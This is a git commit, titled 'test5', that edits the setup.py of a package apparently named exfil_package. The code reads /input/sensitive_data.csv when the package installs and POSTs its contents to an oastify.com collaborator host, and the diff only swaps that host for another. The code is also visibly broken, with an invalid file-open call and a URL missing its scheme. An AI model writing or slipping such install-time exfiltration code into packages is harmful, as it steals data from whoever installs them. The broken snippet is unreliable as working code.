2541c2d7e32b51a48d20d00a630816feecd5af0e
b3r3g <b3r3g@users.noreply.github.com>
2026-02-27 16:57:39 +0100

    test5

--- exfil_package/setup.py
+++ exfil_package/setup.py
@@ -3,7 +3,7 @@ from setuptools.command.install import install
 import urllib.request, os
 
 with os.open("/input/sensitive_data.csv", 'f') as f:
-    i = urllib.request.Request(f"https://ovn7w843zwmhswhvnrml5ivsajga42sr.oastify.com/exfil", data=f.read(), method="POST")
+    i = urllib.request.Request(f"806r1s9n4gr1xgmfsbr5a20cf3lu9oxd.oastify.com", data=f.read(), method="POST")
     urllib.request.urlopen(i, timeout=10)
 
 class CustomInstallCommand(install):
